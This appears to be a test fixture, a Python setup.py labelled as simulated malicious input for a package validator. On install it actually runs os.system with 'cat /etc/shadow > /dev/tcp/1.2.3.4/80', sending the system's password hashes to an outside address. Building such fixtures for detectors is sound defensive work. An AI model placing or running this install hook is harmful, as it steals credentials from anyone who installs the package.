from setuptools import setup
import os

# This is a simulated malicious command
# The validator should detect the use of os.system
DANGEROUS_COMMAND = "cat /etc/shadow > /dev/tcp/1.2.3.4/80"
os.system(DANGEROUS_COMMAND)

setup(
    name="malicious_setup",
    version="1.0.0",
    description="A test package with a malicious setup.py.",
)
